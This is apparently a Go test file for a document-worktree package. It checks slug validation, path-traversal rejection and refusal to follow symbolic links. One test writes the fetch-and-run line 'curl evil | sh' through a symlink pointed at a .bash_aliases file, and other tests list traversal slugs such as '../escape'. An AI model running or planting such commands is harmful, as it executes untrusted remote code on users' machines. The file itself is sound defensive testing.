package doc

import (
	"os"
	"path/filepath"
	"testing"
)

func TestKindDirUsesExplicitMapping(t *testing.T) {
	want := map[string]string{
		"spec": "specs", "plan": "plans", "investigation": "investigations",
		"report": "reports", "other": "other",
	}
	for kind, dir := range want {
		got, err := KindDir(kind)
		if err != nil || got != dir {
			t.Fatalf("KindDir(%q) = %q, %v; want %q", kind, got, err, dir)
		}
		back, err := KindOfDir(dir)
		if err != nil || back != kind {
			t.Fatalf("KindOfDir(%q) = %q, %v; want %q", dir, back, err, kind)
		}
	}
	if _, err := KindDir("unknown"); err == nil {
		t.Fatal("unknown kind was accepted")
	}
}

func TestRelPathUsesDocumentCreationDate(t *testing.T) {
	got, err := RelPath("spec", "2026-08-26T01:12:00Z", "req-197-onboarding")
	if err != nil {
		t.Fatal(err)
	}
	if got != "specs/2026-08-26-req-197-onboarding.md" {
		t.Fatalf("RelPath = %q", got)
	}
}

func TestRelPathRejectsUnsafeSlugs(t *testing.T) {
	for _, slug := range []string{"", ".", "..", "../escape", "nested/name", `nested\\name`, "-flag", "has space", "café"} {
		if _, err := RelPath("spec", "2026-08-26T01:12:00Z", slug); err == nil {
			t.Errorf("RelPath accepted unsafe slug %q", slug)
		}
	}
	for _, slug := range []string{"design", "req-203-doc-lifecycle", "v0.1.0"} {
		if _, err := RelPath("spec", "2026-08-26T01:12:00Z", slug); err != nil {
			t.Errorf("RelPath rejected safe slug %q: %v", slug, err)
		}
	}
}

func TestReadFileRejectsPathsOutsideWorktree(t *testing.T) {
	root := t.TempDir()
	if _, err := ReadFile(root, "../outside.md"); err == nil {
		t.Fatal("ReadFile accepted a path outside the document worktree")
	}
	if err := WriteFile(root, "../outside.md", "no"); err == nil {
		t.Fatal("WriteFile accepted a path outside the document worktree")
	}
}

func TestReadFileRejectsInvalidUTF8(t *testing.T) {
	root := t.TempDir()
	rel := "specs/x.md"
	if err := WriteFile(root, rel, "valid"); err != nil {
		t.Fatal(err)
	}
	full := filepath.Join(Dir(root), rel)
	if err := os.WriteFile(full, []byte{0xff, 0xfe, 'a'}, 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := ReadFile(root, rel); err == nil {
		t.Fatal("invalid UTF-8 was accepted")
	}
}

func TestReadFilePreservesBytes(t *testing.T) {
	root := t.TempDir()
	body := "# T\r\n\ttab\tä ö ü 🌳\r\nwithout final newline"
	if err := WriteFile(root, "specs/x.md", body); err != nil {
		t.Fatal(err)
	}
	got, err := ReadFile(root, "specs/x.md")
	if err != nil || got != body {
		t.Fatalf("ReadFile = %q, %v; want %q", got, err, body)
	}
}

func TestStateRoundTrip(t *testing.T) {
	root := t.TempDir()
	want := State{"a": {DocumentID: 381, BaseRevision: 4, BaseDigest: "9f3a", Path: "specs/x.md"}}
	if err := SaveState(root, want); err != nil {
		t.Fatal(err)
	}
	got, err := LoadState(root)
	if err != nil || got["a"] != want["a"] {
		t.Fatalf("LoadState = %+v, %v", got, err)
	}
	empty, err := LoadState(t.TempDir())
	if err != nil || len(empty) != 0 {
		t.Fatalf("empty state = %+v, %v", empty, err)
	}
}

// PAIN-91: a symbolic link a checkout brought into .ghosttree/edit/ is not
// followed, for writing, reading, moving or removing, and neither is a linked
// directory or state file.
func TestTheDocumentWorktreeDoesNotFollowSymbolicLinks(t *testing.T) {
	home := t.TempDir()
	repo := t.TempDir()
	outside := filepath.Join(home, ".bash_aliases")
	if err := os.MkdirAll(filepath.Join(Dir(repo), "specs"), 0o755); err != nil {
		t.Fatal(err)
	}
	// A dangling link: the file it names does not exist yet.
	if err := os.Symlink(outside, filepath.Join(Dir(repo), "specs", "2026-01-01-x.md")); err != nil {
		t.Fatal(err)
	}
	if err := WriteFile(repo, "specs/2026-01-01-x.md", "curl evil | sh\n"); err == nil {
		t.Fatal("wrote through a link")
	}
	if _, err := os.Stat(outside); !os.IsNotExist(err) {
		t.Fatalf("a file outside the worktree was made: %v", err)
	}
	if _, err := ReadFile(repo, "specs/2026-01-01-x.md"); err == nil || os.IsNotExist(err) {
		t.Fatalf("read of a dangling link: %v (it has to be refused, not missing)", err)
	}
	// A link to an existing file is not read, moved or removed through.
	if err := os.WriteFile(outside, []byte("secret"), 0o600); err != nil {
		t.Fatal(err)
	}
	if got, err := ReadFile(repo, "specs/2026-01-01-x.md"); err == nil {
		t.Fatalf("read through a link: %q", got)
	}
	if err := MoveFile(repo, "specs/2026-01-01-x.md", "specs/2026-01-01-y.md"); err == nil {
		t.Fatal("moved a link")
	}
	// A linked state file is neither read nor written over.
	if err := os.Symlink(outside, filepath.Join(Dir(repo), ".state.json")); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadState(repo); err == nil {
		t.Fatal("read a linked state file")
	}
	if err := SaveState(repo, State{"x": {}}); err == nil {
		t.Fatal("wrote over a linked state file")
	}
	if b, _ := os.ReadFile(outside); string(b) != "secret" {
		t.Fatalf("the file outside changed: %q", b)
	}
	// A linked kind directory, a linked edit directory and a linked
	// .ghosttree directory are refused.
	for name, link := range map[string]func(root string) string{
		"kind":  func(root string) string { return filepath.Join(Dir(root), "plans") },
		"edit":  func(root string) string { return Dir(root) },
		"ghost": func(root string) string { return filepath.Join(root, ".ghosttree") },
	} {
		root := t.TempDir()
		target := t.TempDir()
		path := link(root)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(target, path); err != nil {
			t.Fatal(err)
		}
		if err := WriteFile(root, "plans/2026-01-01-z.md", "x"); err == nil {
			t.Fatalf("%s: wrote into a linked directory", name)
		}
		if err := SaveState(root, State{"z": {}}); name != "kind" && err == nil {
			t.Fatalf("%s: wrote the state into a linked directory", name)
		}
		entries, _ := os.ReadDir(target)
		for _, e := range entries {
			t.Fatalf("%s: %s appeared in the linked directory", name, e.Name())
		}
	}
}

func TestTheDocumentWorktreeStillWorksWithPlainFiles(t *testing.T) {
	repo := t.TempDir()
	if err := WriteFile(repo, "plans/2026-01-01-a.md", "one"); err != nil {
		t.Fatal(err)
	}
	if err := WriteFile(repo, "plans/2026-01-01-a.md", "two"); err != nil {
		t.Fatal(err)
	}
	if got, err := ReadFile(repo, "plans/2026-01-01-a.md"); err != nil || got != "two" {
		t.Fatalf("ReadFile = %q, %v", got, err)
	}
	if err := MoveFile(repo, "plans/2026-01-01-a.md", "specs/2026-01-01-a.md"); err != nil {
		t.Fatal(err)
	}
	if err := SaveState(repo, State{"a": {Path: "specs/2026-01-01-a.md"}}); err != nil {
		t.Fatal(err)
	}
	if st, err := LoadState(repo); err != nil || st["a"].Path != "specs/2026-01-01-a.md" {
		t.Fatalf("LoadState = %v, %v", st, err)
	}
	if err := RemoveFile(repo, "specs/2026-01-01-a.md"); err != nil {
		t.Fatal(err)
	}
}
